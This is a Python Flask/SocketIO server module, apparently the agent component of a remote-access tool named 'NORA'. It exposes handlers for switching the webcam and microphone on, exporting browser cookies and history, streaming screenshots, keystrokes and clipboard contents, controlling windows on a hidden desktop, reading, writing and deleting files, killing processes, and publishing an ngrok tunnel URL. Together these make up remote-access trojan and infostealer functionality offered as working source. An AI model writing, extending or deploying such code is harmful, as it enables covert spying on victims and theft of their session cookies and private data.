import os
import sys
import platform
import socket as _sock
from flask import Flask, render_template, jsonify, request
from flask_socketio import SocketIO
import processes as proc
import file_manager as fm
import windows_control as wc

def _res(rel):
    base = sys._MEIPASS if getattr(sys, "frozen", False) else os.path.dirname(os.path.abspath(__file__))
    return os.path.join(base, rel)

app = Flask(__name__, template_folder=_res("templates"), static_folder=None)
app.config["SECRET_KEY"] = os.urandom(24)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")

_AGENT_NAME = os.environ.get("NORA_NAME", "") or platform.node() or _sock.gethostname() or "local"

_controller = None
_recorder   = None
_camera     = None
_mic        = None


def init(controller_fn, recorder, camera, mic=None):
    global _controller, _recorder, _camera, _mic
    _controller = controller_fn
    _recorder   = recorder
    _camera     = camera
    _mic        = mic


@app.route("/")
def index():
    return render_template("viewer.html")


# ── Hub join (local mode) ─────────────────────────────────────────────────────
@socketio.on("hub_join")
def on_hub_join(_data=None):
    socketio.emit("agent_list", [{"name": _AGENT_NAME}])


# ── Camera (socket events for local hub) ─────────────────────────────────────
@socketio.on("camera_on")
def on_cam_on_sock(_data=None):
    if _camera:
        ok = _camera.start()
        socketio.emit("camera_state", {"active": ok})

@socketio.on("camera_off")
def on_cam_off_sock(_data=None):
    if _camera:
        _camera.stop()
        socketio.emit("camera_state", {"active": False})

@socketio.on("mic_on")
def on_mic_on(_data=None):
    if _mic:
        ok = _mic.start()
        socketio.emit("mic_state", {"active": ok})

@socketio.on("mic_off")
def on_mic_off(_data=None):
    if _mic:
        _mic.stop()
        socketio.emit("mic_state", {"active": False})


@app.route("/camera/start", methods=["POST"])
def camera_start():
    if not _camera: return jsonify({"ok": False})
    ok = _camera.start()
    socketio.emit("camera_state", {"active": ok})
    return jsonify({"ok": ok})

@app.route("/camera/stop", methods=["POST"])
def camera_stop():
    if not _camera: return jsonify({"ok": False})
    _camera.stop()
    socketio.emit("camera_state", {"active": False})
    return jsonify({"ok": True})


# ── Processes ─────────────────────────────────────────────────────────────────
@app.route("/processes")
def get_processes_http():
    return jsonify(proc.get_processes())

@app.route("/processes/kill", methods=["POST"])
def kill_process_http():
    pid = request.json.get("pid")
    if not pid: return jsonify({"ok": False})
    ok = proc.kill_process(int(pid))
    return jsonify({"ok": ok})

@socketio.on("get_processes")
def on_get_processes_sock(_data=None):
    procs = proc.get_processes()
    socketio.emit("processes_result", {"processes": procs})

@socketio.on("kill_process")
def on_kill_process_sock(data):
    try: proc.kill_process(int(data.get("pid", 0)))
    except Exception: pass


# ── Control ───────────────────────────────────────────────────────────────────
@socketio.on("command")
def on_command(data):
    if _controller:
        try: _controller(data)
        except Exception: pass


# ── File Manager ──────────────────────────────────────────────────────────────
@socketio.on("list_dir")
def on_list_dir(data):
    path = data.get("path") or fm.home_dir()
    result = fm.list_dir(path)
    socketio.emit("dir_result", result)

@socketio.on("read_file")
def on_read_file(data):
    result = fm.read_file(data.get("path", ""))
    socketio.emit("file_data", result)

@socketio.on("write_file")
def on_write_file(data):
    result = fm.write_file(data.get("path", ""), data.get("data", ""))
    socketio.emit("write_result", result)

@socketio.on("delete_path")
def on_delete_path(data):
    result = fm.delete_path(data.get("path", ""))
    result["path"] = data.get("path", "")
    socketio.emit("delete_result", result)


# ── Window capture (streams target window without switching desktops) ─────────
@socketio.on("win_capture_start")
def on_win_capture_start(data):
    hwnd = data.get("hwnd")
    if hwnd:
        wc.start_window_capture(int(hwnd), lambda b64: socketio.emit("win_frame", {"data": b64, "_agent": _AGENT_NAME}))

@socketio.on("win_capture_stop")
def on_win_capture_stop(_data=None):
    wc.stop_window_capture()


# ── Window / desktop control ──────────────────────────────────────────────────

@socketio.on("list_windows")
def on_list_windows(data):
    wins = wc.list_windows()
    socketio.emit("windows_list", {"windows": wins})

@socketio.on("win_key")
def on_win_key(data):
    hwnd = data.get("hwnd")
    if hwnd:
        wc.send_key(int(hwnd), data.get("key", ""))

@socketio.on("win_mouse")
def on_win_mouse(data):
    hwnd = data.get("hwnd")
    if not hwnd:
        return
    import mss
    with mss.mss() as s:
        m = s.monitors[1]
        sw_r, sh_r = m["width"], m["height"]
    sx = data.get("x", 0) / data.get("sw", sw_r) * sw_r
    sy = data.get("y", 0) / data.get("sh", sh_r) * sh_r
    wc.send_mouse(int(hwnd), sx, sy, data.get("action", "click"), data.get("button", 0))

@socketio.on("desktop_cmd")
def on_desktop_cmd(data):
    {"new": wc.desktop_new, "left": wc.desktop_left,
     "right": wc.desktop_right, "close": wc.desktop_close}.get(data.get("cmd", ""), lambda: None)()


# ── Cookie manager ───────────────────────────────────────────────────────────
@socketio.on("export_cookies")
def on_export_cookies(_data=None):
    try:
        import cookie_manager as cm
        cookies = cm.export_all()
        socketio.emit("cookies_data", {"cookies": cookies, "count": len(cookies)})
    except Exception as e:
        socketio.emit("cookies_data", {"error": str(e), "cookies": [], "count": 0})

@socketio.on("import_cookies")
def on_import_cookies(data):
    try:
        import cookie_manager as cm
        result = cm.import_all(data.get("cookies", []))
        socketio.emit("import_result", result)
    except Exception as e:
        socketio.emit("import_result", {"ok": False, "message": str(e)})


# ── System info ──────────────────────────────────────────────────────────────
@socketio.on("get_sysinfo")
def on_get_sysinfo(_data=None):
    try:
        import sysinfo
        info = sysinfo.get_info()
        socketio.emit("sysinfo_result", info)
    except Exception as e:
        socketio.emit("sysinfo_result", {"error": str(e)})


# ── Browser history ──────────────────────────────────────────────────────────
@socketio.on("get_history")
def on_get_history(data=None):
    try:
        import browser_history as bh
        limit = (data or {}).get("limit", 500)
        history = bh.export_all(limit=limit)
        socketio.emit("history_result", {"history": history, "count": len(history)})
    except Exception as e:
        socketio.emit("history_result", {"error": str(e), "history": [], "count": 0})


# ── On-demand screenshot ────────────────────────────────────────────────────
@socketio.on("take_screenshot")
def on_take_screenshot(_data=None):
    try:
        import mss as _mss, base64 as _b64
        from PIL import Image as _Img
        import io as _io
        with _mss.mss() as sct:
            shot = sct.grab(sct.monitors[1])
            img = _Img.frombytes("RGB", shot.size, shot.bgra, "raw", "BGRX")
            buf = _io.BytesIO()
            img.save(buf, format="PNG")
            b64 = _b64.b64encode(buf.getvalue()).decode()
            socketio.emit("screenshot_result", {"data": b64, "_agent": _AGENT_NAME})
    except Exception as e:
        socketio.emit("screenshot_result", {"error": str(e)})


# ── Clipboard inject ────────────────────────────────────────────────────────
@socketio.on("clipboard_set")
def on_clipboard_set(data):
    try:
        import pyperclip
        text = data.get("text", "")
        pyperclip.copy(text)
        socketio.emit("clipboard_set_result", {"ok": True})
    except Exception as e:
        socketio.emit("clipboard_set_result", {"ok": False, "error": str(e)})


# ── Broadcast helpers ─────────────────────────────────────────────────────────
def broadcast_frame(b64):      socketio.emit("frame",        {"data": b64,  "_agent": _AGENT_NAME})
def broadcast_key(data):       socketio.emit("key",          {**data,       "_agent": _AGENT_NAME})
def broadcast_camera(b64):     socketio.emit("camera_frame", {"data": b64,  "_agent": _AGENT_NAME})
def broadcast_clipboard(text): socketio.emit("clipboard",    {"text": text, "_agent": _AGENT_NAME})
def broadcast_ngrok_url(url):  socketio.emit("ngrok_url",   {"url": url,   "_agent": _AGENT_NAME})
def broadcast_audio(b64):      socketio.emit("audio",        {"data": b64,  "_agent": _AGENT_NAME})


def run(host="0.0.0.0", port=9090):
    socketio.run(app, host=host, port=port, allow_unsafe_werkzeug=True)
